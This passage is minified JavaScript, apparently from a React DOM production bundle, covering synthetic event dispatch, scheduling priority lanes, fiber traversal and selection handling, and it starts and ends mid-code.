t.is=="string";switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var sl=null;function Yl(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var al=null,Qt=null,Gt=null;function Ki(e){if(e=Zn(e)){if(typeof al!="function")throw Error(v(280));var t=e.stateNode;t&&(t=so(t),al(e.stateNode,e.type,t))}}function va(e){Qt?Gt?Gt.push(e):Gt=[e]:Qt=e}function ya(){if(Qt){var e=Qt,t=Gt;if(Gt=Qt=null,Ki(e),t)for(e=0;e<t.length;e++)Ki(t[e])}}function Sa(e,t){return e(t)}function wa(){}var Po=!1;function ka(e,t,n){if(Po)return e(t,n);Po=!0;try{return Sa(e,t,n)}finally{Po=!1,(Qt!==null||Gt!==null)&&(wa(),ya())}}function _n(e,t){var n=e.stateNode;if(n===null)return null;var r=so(n);if(r===null)return null;n=r[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(r=!r.disabled)||(e=e.type,r=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!r;break e;default:e=!1}if(e)return null;if(n&&typeof n!="function")throw Error(v(231,t,typeof n));return n}var ul=!1;if($e)try{var fn={};Object.defineProperty(fn,"passive",{get:function(){ul=!0}}),window.addEventListener("test",fn,fn),window.removeEventListener("test",fn,fn)}catch{ul=!1}function Uc(e,t,n,r,o,l,i,s,a){var c=Array.prototype.slice.call(arguments,3);try{t.apply(n,c)}catch(p){this.onError(p)}}var xn=!1,Lr=null,Dr=!1,cl=null,Wc={onError:function(e){xn=!0,Lr=e}};function Vc(e,t,n,r,o,l,i,s,a){xn=!1,Lr=null,Uc.apply(Wc,arguments)}function Bc(e,t,n,r,o,l,i,s,a){if(Vc.apply(this,arguments),xn){if(xn){var c=Lr;xn=!1,Lr=null}else throw Error(v(198));Dr||(Dr=!0,cl=c)}}function Ot(e){var t=e,n=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,t.flags&4098&&(n=t.return),e=t.return;while(e)}return t.tag===3?n:null}function Ca(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function Qi(e){if(Ot(e)!==e)throw Error(v(188))}function Jc(e){var t=e.alternate;if(!t){if(t=Ot(e),t===null)throw Error(v(188));return t!==e?null:e}for(var n=e,r=t;;){var o=n.return;if(o===null)break;var l=o.alternate;if(l===null){if(r=o.return,r!==null){n=r;continue}break}if(o.child===l.child){for(l=o.child;l;){if(l===n)return Qi(o),e;if(l===r)return Qi(o),t;l=l.sibling}throw Error(v(188))}if(n.return!==r.return)n=o,r=l;else{for(var i=!1,s=o.child;s;){if(s===n){i=!0,n=o,r=l;break}if(s===r){i=!0,r=o,n=l;break}s=s.sibling}if(!i){for(s=l.child;s;){if(s===n){i=!0,n=l,r=o;break}if(s===r){i=!0,r=l,n=o;break}s=s.sibling}if(!i)throw Error(v(189))}}if(n.alternate!==r)throw Error(v(190))}if(n.tag!==3)throw Error(v(188));return n.stateNode.current===n?e:t}function Ta(e){return e=Jc(e),e!==null?xa(e):null}function xa(e){if(e.tag===5||e.tag===6)return e;for(e=e.child;e!==null;){var t=xa(e);if(t!==null)return t;e=e.sibling}return null}var Ea=ve.unstable_scheduleCallback,Gi=ve.unstable_cancelCallback,$c=ve.unstable_shouldYield,Kc=ve.unstable_requestPaint,$=ve.unstable_now,Qc=ve.unstable_getCurrentPriorityLevel,Zl=ve.unstable_ImmediatePriority,Pa=ve.unstable_UserBlockingPriority,_r=ve.unstable_NormalPriority,Gc=ve.unstable_LowPriority,ja=ve.unstable_IdlePriority,ro=null,ze=null;function bc(e){if(ze&&typeof ze.onCommitFiberRoot=="function")try{ze.onCommitFiberRoot(ro,e,void 0,(e.current.flags&128)===128)}catch{}}var Le=Math.clz32?Math.clz32:Zc,Xc=Math.log,Yc=Math.LN2;function Zc(e){return e>>>=0,e===0?32:31-(Xc(e)/Yc|0)|0}var ir=64,sr=4194304;function kn(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return e&4194240;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return e&130023424;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function Ir(e,t){var n=e.pendingLanes;if(n===0)return 0;var r=0,o=e.suspendedLanes,l=e.pingedLanes,i=n&268435455;if(i!==0){var s=i&~o;s!==0?r=kn(s):(l&=i,l!==0&&(r=kn(l)))}else i=n&~o,i!==0?r=kn(i):l!==0&&(r=kn(l));if(r===0)return 0;if(t!==0&&t!==r&&!(t&o)&&(o=r&-r,l=t&-t,o>=l||o===16&&(l&4194240)!==0))return t;if(r&4&&(r|=n&16),t=e.entangledLanes,t!==0)for(e=e.entanglements,t&=r;0<t;)n=31-Le(t),o=1<<n,r|=e[n],t&=~o;return r}function qc(e,t){switch(e){case 1:case 2:case 4:return t+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return-1;case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function ed(e,t){for(var n=e.suspendedLanes,r=e.pingedLanes,o=e.expirationTimes,l=e.pendingLanes;0<l;){var i=31-Le(l),s=1<<i,a=o[i];a===-1?(!(s&n)||s&r)&&(o[i]=qc(s,t)):a<=t&&(e.expiredLanes|=s),l&=~s}}function dl(e){return e=e.pendingLanes&-1073741825,e!==0?e:e&1073741824?1073741824:0}function Ra(){var e=ir;return ir<<=1,!(ir&4194240)&&(ir=64),e}function jo(e){for(var t=[],n=0;31>n;n++)t.push(e);return t}function Xn(e,t,n){e.pendingLanes|=t,t!==536870912&&(e.suspendedLanes=0,e.pingedLanes=0),e=e.eventTimes,t=31-Le(t),e[t]=n}function td(e,t){var n=e.pendingLanes&~t;e.pendingLanes=t,e.suspendedLanes=0,e.pingedLanes=0,e.expiredLanes&=t,e.mutableReadLanes&=t,e.entangledLanes&=t,t=e.entanglements;var r=e.eventTimes;for(e=e.expirationTimes;0<n;){var o=31-Le(n),l=1<<o;t[o]=0,r[o]=-1,e[o]=-1,n&=~l}}function ql(e,t){var n=e.entangledLanes|=t;for(e=e.entanglements;n;){var r=31-Le(n),o=1<<r;o&t|e[r]&t&&(e[r]|=t),n&=~o}}var D=0;function Na(e){return e&=-e,1<e?4<e?e&268435455?16:536870912:4:1}var Ma,ei,Oa,La,Da,fl=!1,ar=[],rt=null,ot=null,lt=null,In=new Map,An=new Map,qe=[],nd="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function bi(e,t){switch(e){case"focusin":case"focusout":rt=null;break;case"dragenter":case"dragleave":ot=null;break;case"mouseover":case"mouseout":lt=null;break;case"pointerover":case"pointerout":In.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":An.delete(t.pointerId)}}function pn(e,t,n,r,o,l){return e===null||e.nativeEvent!==l?(e={blockedOn:t,domEventName:n,eventSystemFlags:r,nativeEvent:l,targetContainers:[o]},t!==null&&(t=Zn(t),t!==null&&ei(t)),e):(e.eventSystemFlags|=r,t=e.targetContainers,o!==null&&t.indexOf(o)===-1&&t.push(o),e)}function rd(e,t,n,r,o){switch(t){case"focusin":return rt=pn(rt,e,t,n,r,o),!0;case"dragenter":return ot=pn(ot,e,t,n,r,o),!0;case"mouseover":return lt=pn(lt,e,t,n,r,o),!0;case"pointerover":var l=o.pointerId;return In.set(l,pn(In.get(l)||null,e,t,n,r,o)),!0;case"gotpointercapture":return l=o.pointerId,An.set(l,pn(An.get(l)||null,e,t,n,r,o)),!0}return!1}function _a(e){var t=wt(e.target);if(t!==null){var n=Ot(t);if(n!==null){if(t=n.tag,t===13){if(t=Ca(n),t!==null){e.blockedOn=t,Da(e.priority,function(){Oa(n)});return}}else if(t===3&&n.stateNode.current.memoizedState.isDehydrated){e.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}e.blockedOn=null}function kr(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var n=pl(e.domEventName,e.eventSystemFlags,t[0],e.nativeEvent);if(n===null){n=e.nativeEvent;var r=new n.constructor(n.type,n);sl=r,n.target.dispatchEvent(r),sl=null}else return t=Zn(n),t!==null&&ei(t),e.blockedOn=n,!1;t.shift()}return!0}function Xi(e,t,n){kr(e)&&n.delete(t)}function od(){fl=!1,rt!==null&&kr(rt)&&(rt=null),ot!==null&&kr(ot)&&(ot=null),lt!==null&&kr(lt)&&(lt=null),In.forEach(Xi),An.forEach(Xi)}function mn(e,t){e.blockedOn===t&&(e.blockedOn=null,fl||(fl=!0,ve.unstable_scheduleCallback(ve.unstable_NormalPriority,od)))}function Fn(e){function t(o){return mn(o,e)}if(0<ar.length){mn(ar[0],e);for(var n=1;n<ar.length;n++){var r=ar[n];r.blockedOn===e&&(r.blockedOn=null)}}for(rt!==null&&mn(rt,e),ot!==null&&mn(ot,e),lt!==null&&mn(lt,e),In.forEach(t),An.forEach(t),n=0;n<qe.length;n++)r=qe[n],r.blockedOn===e&&(r.blockedOn=null);for(;0<qe.length&&(n=qe[0],n.blockedOn===null);)_a(n),n.blockedOn===null&&qe.shift()}var bt=be.ReactCurrentBatchConfig,Ar=!0;function ld(e,t,n,r){var o=D,l=bt.transition;bt.transition=null;try{D=1,ti(e,t,n,r)}finally{D=o,bt.transition=l}}function id(e,t,n,r){var o=D,l=bt.transition;bt.transition=null;try{D=4,ti(e,t,n,r)}finally{D=o,bt.transition=l}}function ti(e,t,n,r){if(Ar){var o=pl(e,t,n,r);if(o===null)Fo(e,t,r,Fr,n),bi(e,r);else if(rd(o,e,t,n,r))r.stopPropagation();else if(bi(e,r),t&4&&-1<nd.indexOf(e)){for(;o!==null;){var l=Zn(o);if(l!==null&&Ma(l),l=pl(e,t,n,r),l===null&&Fo(e,t,r,Fr,n),l===o)break;o=l}o!==null&&r.stopPropagation()}else Fo(e,t,r,null,n)}}var Fr=null;function pl(e,t,n,r){if(Fr=null,e=Yl(r),e=wt(e),e!==null)if(t=Ot(e),t===null)e=null;else if(n=t.tag,n===13){if(e=Ca(t),e!==null)return e;e=null}else if(n===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null);return Fr=e,null}function Ia(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Qc()){case Zl:return 1;case Pa:return 4;case _r:case Gc:return 16;case ja:return 536870912;default:return 16}default:return 16}}var tt=null,ni=null,Cr=null;function Aa(){if(Cr)return Cr;var e,t=ni,n=t.length,r,o="value"in tt?tt.value:tt.textContent,l=o.length;for(e=0;e<n&&t[e]===o[e];e++);var i=n-e;for(r=1;r<=i&&t[n-r]===o[l-r];r++);return Cr=o.slice(e,1<r?1-r:void 0)}function Tr(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function ur(){return!0}function Yi(){return!1}function Se(e){function t(n,r,o,l,i){this._reactName=n,this._targetInst=o,this.type=r,this.nativeEvent=l,this.target=i,this.currentTarget=null;for(var s in e)e.hasOwnProperty(s)&&(n=e[s],this[s]=n?n(l):l[s]);return this.isDefaultPrevented=(l.defaultPrevented!=null?l.defaultPrevented:l.returnValue===!1)?ur:Yi,this.isPropagationStopped=Yi,this}return W(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var n=this.nativeEvent;n&&(n.preventDefault?n.preventDefault():typeof n.returnValue!="unknown"&&(n.returnValue=!1),this.isDefaultPrevented=ur)},stopPropagation:function(){var n=this.nativeEvent;n&&(n.stopPropagation?n.stopPropagation():typeof n.cancelBubble!="unknown"&&(n.cancelBubble=!0),this.isPropagationStopped=ur)},persist:function(){},isPersistent:ur}),t}var sn={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},ri=Se(sn),Yn=W({},sn,{view:0,detail:0}),sd=Se(Yn),Ro,No,hn,oo=W({},Yn,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:oi,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==hn&&(hn&&e.type==="mousemove"?(Ro=e.screenX-hn.screenX,No=e.screenY-hn.screenY):No=Ro=0,hn=e),Ro)},movementY:function(e){return"movementY"in e?e.movementY:No}}),Zi=Se(oo),ad=W({},oo,{dataTransfer:0}),ud=Se(ad),cd=W({},Yn,{relatedTarget:0}),Mo=Se(cd),dd=W({},sn,{animationName:0,elapsedTime:0,pseudoElement:0}),fd=Se(dd),pd=W({},sn,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),md=Se(pd),hd=W({},sn,{data:0}),qi=Se(hd),gd={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},vd={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},yd={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Sd(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=yd[e])?!!t[e]:!1}function oi(){return Sd}var wd=W({},Yn,{key:function(e){if(e.key){var t=gd[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=Tr(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?vd[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:oi,charCode:function(e){return e.type==="keypress"?Tr(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?Tr(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),kd=Se(wd),Cd=W({},oo,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),es=Se(Cd),Td=W({},Yn,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:oi}),xd=Se(Td),Ed=W({},sn,{propertyName:0,elapsedTime:0,pseudoElement:0}),Pd=Se(Ed),jd=W({},oo,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Rd=Se(jd),Nd=[9,13,27,32],li=$e&&"CompositionEvent"in window,En=null;$e&&"documentMode"in document&&(En=document.documentMode);var Md=$e&&"TextEvent"in window&&!En,Fa=$e&&(!li||En&&8<En&&11>=En),ts=" ",ns=!1;function za(e,t){switch(e){case"keyup":return Nd.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Ha(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var At=!1;function Od(e,t){switch(e){case"compositionend":return Ha(t);case"keypress":return t.which!==32?null:(ns=!0,ts);case"textInput":return e=t.data,e===ts&&ns?null:e;default:return null}}function Ld(e,t){if(At)return e==="compositionend"||!li&&za(e,t)?(e=Aa(),Cr=ni=tt=null,At=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return Fa&&t.locale!=="ko"?null:t.data;default:return null}}var Dd={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function rs(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!Dd[e.type]:t==="textarea"}function Ua(e,t,n,r){va(r),t=zr(t,"onChange"),0<t.length&&(n=new ri("onChange","change",null,n,r),e.push({event:n,listeners:t}))}var Pn=null,zn=null;function _d(e){Ya(e,0)}function lo(e){var t=Ht(e);if(ca(t))return e}function Id(e,t){if(e==="change")return t}var Wa=!1;if($e){var Oo;if($e){var Lo="oninput"in document;if(!Lo){var os=document.createElement("div");os.setAttribute("oninput","return;"),Lo=typeof os.oninput=="function"}Oo=Lo}else Oo=!1;Wa=Oo&&(!document.documentMode||9<document.documentMode)}function ls(){Pn&&(Pn.detachEvent("onpropertychange",Va),zn=Pn=null)}function Va(e){if(e.propertyName==="value"&&lo(zn)){var t=[];Ua(t,zn,e,Yl(e)),ka(_d,t)}}function Ad(e,t,n){e==="focusin"?(ls(),Pn=t,zn=n,Pn.attachEvent("onpropertychange",Va)):e==="focusout"&&ls()}function Fd(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return lo(zn)}function zd(e,t){if(e==="click")return lo(t)}function Hd(e,t){if(e==="input"||e==="change")return lo(t)}function Ud(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var _e=typeof Object.is=="function"?Object.is:Ud;function Hn(e,t){if(_e(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var n=Object.keys(e),r=Object.keys(t);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var o=n[r];if(!bo.call(t,o)||!_e(e[o],t[o]))return!1}return!0}function is(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function ss(e,t){var n=is(e);e=0;for(var r;n;){if(n.nodeType===3){if(r=e+n.textContent.length,e<=t&&r>=t)return{node:n,offset:t-e};e=r}e:{for(;n;){if(n.nextSibling){n=n.nextSibling;break e}n=n.parentNode}n=void 0}n=is(n)}}function Ba(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?Ba(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function Ja(){for(var e=window,t=Or();t instanceof e.HTMLIFrameElement;){try{var n=typeof t.contentWindow.location.href=="string"}catch{n=!1}if(n)e=t.contentWindow;else break;t=Or(e.document)}return t}function ii(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}function Wd(e){var t=Ja(),n=e.focusedElem,r=e.selectionRange;if(t!==n&&n&&n.ownerDocument&&Ba(n.ownerDocument.documentElement,n)){if(r!==null&&ii(n)){if(t=r.start,e=r.end,e===void 0&&(e=t),"selectionStart"in n)n.selectionStart=t,n.selectionEnd=Math.min(e,n.value.length);else if(e=(t=n.ownerDocument||document)&&t.defaultView||window,e.getSelection){e=e.getSelection();var o=n.textContent.length,l=Math.min(r.start,o);r=r.end===void 0?l:Math.min(r.end,o),!e.extend&&l>r&&(o=r,r=l,l=o),o=ss(n,l);var i=ss(n,r);o&&i&&(e.rangeCount!==1||e.anchorNode!==o.node||e.anchorOffset!==o.offset||e.focusNode!==i.node||e.focusOffset!==i.offset)&&(t=t.createRange(),t.setStart(o.node,o.offset),e.removeAllRanges(),l>r?(e.addRange(t),e.extend(i.node,i.offset)):(t.setEnd(i.node,i.offset),e.addRange(t)))}}for(t=[],e=n;e=e.parentNode;)e.nodeType===1&&t.push({element:e,left:e.scrollLeft,top:e.scrollTop});for(typeof n.focus=="function"&&n.focus(),n=0;n<t.length;n++)e=t[n],e.element.scrollLeft=e.left,e.element.scrollTop=e.top}}var Vd=$e&&"documentMode"in document&&11>=document.documentMode,Ft=null,ml=null,jn=null,hl=!1;function as(e,t,n){var r=n.window===n?n.document:n.nodeType===9?n:n.ownerDocument;hl||Ft==null||Ft!==Or(r)||(r=Ft,"selectionStart"in r&&ii(r)?r={start:r.selectionStart,end:r.selectionEnd}:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection(),r={anchorNode:r.anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset}),jn&&Hn(jn,r)||(jn=r,r=zr(ml,"onSelect"),0<r.length&&(t=new ri("onSelect","select",null,t,n),e.push({event:t,listeners:r}),t.target=Ft)))}function cr(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n["Webkit"+e]="webkit"+t,n["Moz"+e]="moz"+t,n}var zt={animationend:cr("Animation","AnimationEnd"),animationiteration:cr("Animation","AnimationIteration"),animationstart:cr("Animation","AnimationStart"),transitionend:cr("Transition","TransitionEnd")},Do={},$a={};$e&&($a=document.createElement("div").style,"AnimationEvent"in window||(delete zt.animationend.animation,delete zt.animationiteration.animation,delete zt.animationstart.animation),"TransitionEvent"in window||delete zt.transitionend.transition);function io(e){if(Do[e])return Do[e];if(!zt[e])return e;var t=zt[e],n;for(n in t)if(t.hasOwnProperty(n)&&n in $a)return Do[e]=t[n];return e}var Ka=io("animationend"),Qa=io("animationiteration"),Ga=io("animationstart"),ba=io("transitionend"),Xa=new Map,us="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function pt(e,t){Xa.set(e,t),Mt(t,[e])}for(var _o=0;_o<us.length;_o++){var Io=us[_o],Bd=Io.toLowerCase(),Jd=Io[0].toUpperCase()+Io.slice(1);pt(Bd,"on"+Jd)}pt(Ka,"onAnimationEnd");pt(Qa,"onAnimationIteration");pt(Ga,"onAnimationStart");pt("dblclick","onDoubleClick");pt("focusin","onFocus");pt("focusout","onBlur");pt(ba,"onTransitionEnd");Zt("onMouseEnter",["mouseout","mouseover"]);Zt("onMouseLeave",["mouseout","mouseover"]);Zt("onPointerEnter",["pointerout","pointerover"]);Zt("onPointerLeave",["pointerout","pointerover"]);Mt("onChange","change click focusin focusout input keydown keyup selectionchange".split(" "));Mt("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" "));Mt("onBeforeInput",["compositionend","keypress","textInput","paste"]);Mt("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" "));Mt("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" "));Mt("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Cn="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),$d=new Set("cancel close invalid load scroll toggle".split(" ").concat(Cn));function cs(e,t,n){var r=e.type||"unknown-event";e.currentTarget=n,Bc(r,t,void 0,e),e.currentTarget=null}function Ya(e,t){t=(t&4)!==0;for(var n=0;n<e.length;n++){var r=e[n],o=r.event;r=r.listeners;e:{var l=void 0;if(t)for(var i=r.length-1;0<=i;i--){var s=r[i],a=s.instance,c=s.currentTarget;if(s=s.listener,a!==l&&o.isPropagationStopped())break e;cs(o,s,c),l=a}else for(i=0;i<r.length;i++){if(s=r[i],a=s.instance,c=s.currentTarget,s=s.listener,a!==l&&o.isPropagationStopped())break e;cs(o,s,c),l=a}}}if(Dr)throw e=cl,Dr=!1,cl=null,e}function I(e,t){var n=t[wl];n===void 0&&(n=t[wl]=new Set);var r=e+"__bubble";n.has(r)||(Za(t,e,2,!1),n.add(r))}function Ao(e,t,n){var r=0;t&&(r|=4),Za(n,e,r,t)}var dr="_reactListening"+Math.random().toString(36).slice(2);function Un(e){if(!e[dr]){e[dr]=!0,la.forEach(function(n){n!=="selectionchange"&&($d.has(n)||Ao(n,!1,e),Ao(n,!0,e))});var t=e.nodeType===9?e:e.ownerDocument;t===null||t[dr]||(t[dr]=!0,Ao("selectionchange",!1,t))}}function Za(e,t,n,r){switch(Ia(t)){case 1:var o=ld;break;case 4:o=id;break;default:o=ti}n=o.bind(null,t,n,e),o=void 0,!ul||t!=="touchstart"&&t!=="touchmove"&&t!=="wheel"||(o=!0),r?o!==void 0?e.addEventListener(t,n,{capture:!0,passive:o}):e.addEventListener(t,n,!0):o!==void 0?e.addEventListener(t,n,{passive:o}):e.addEventListener(t,n,!1)}function Fo(e,t,n,r,o){var l=r;if(!(t&1)&&!(t&2)&&r!==null)e:for(;;){if(r===null)return;var i=r.tag;if(i===3||i===4){var s=r.stateNode.containerInfo;if(s===o||s.nodeType===8&&s.parentNode===o)break;if(i===4)for(i=r.return;i!==null;){var a=i.tag;if((a===3||a===4)&&(a=i.stateNode.containerInfo,a===o||a.nodeType===8&&a.parentNode===o))return;i=i.return}for(;s!==null;){if(i=wt(s),i===null)return;if(a=i.tag,a===5||a===6){r=l=i;continue e}s=s.parentNode}}r=r.return}ka(function(){var c=l,p=Yl(n),h=[];e:{var m=Xa.get(e);if(m!==void 0){var S=ri,w=e;switch(e){case"keypress":if(Tr(n)===0)break e;case"keydown":case"keyup":S=kd;break;case"focusin":w="focus",S=Mo;break;case"focusout":w="blur",S=Mo;break;case"beforeblur":case"afterblur":S=Mo;break;case"click":if(n.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":S=Zi;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":S=ud;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":S=xd;break;case Ka:case Qa:case Ga:S=fd;break;case ba:S=Pd;break;case"scroll":S=sd;break;case"wheel":S=Rd;break;case"copy":case"cut":case"paste":S=md;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":S=es}var k=(t&4)!==0,F=!k&&e==="scroll",d=k?m!==null?m+"Capture":null:m;k=[];for(var u=c,f;u!==null;){f=u;var g=f.stateNode;if(f.tag===5&&g!==null&&(f=g,d!==null&&(g=_n(u,d),g!=null&&k.push(Wn(u,g,f)))),F)break;u=u.return}0<k.length&&(m=new S(m,w,null,n,p),h.push({event:m,listeners:k}))}}if(!(t&7)){e:{if(m=e==="mouseover"||e==="pointerover",S=e==="mouseout"||e==="pointerout",m&&n!==sl&&(w=n.relatedTarget||n.fromElement)&&(wt(w)||w[Ke]))break e;if((S||m)&&(m=p.window===p?p:(m=p.ownerDocument)?m.defaultView||m.parentWindow:window,S?(w=n.relatedTarget||n.toElement,S=c,w=w?wt(w):null,w!==null&&(F=Ot(w),w!==F||w.tag!==5&&w.tag!==6)&&(w=null)):(S=null,w=c),S!==w)){if(k=Zi,g="onMouseLeave",d="onMouseEnter",u="mouse",(e==="pointerout"||e==="pointerover")&&(k=es,g="onPointerLeave",d="onPointerEnter",u="pointer"),F=S==null?m:Ht(S),f=w==null?m:Ht(w),m=new k(g,u+"leave",S,n,p),m.target=F,m.relatedTarget=f,g=null,wt(p)===c&&(k=new 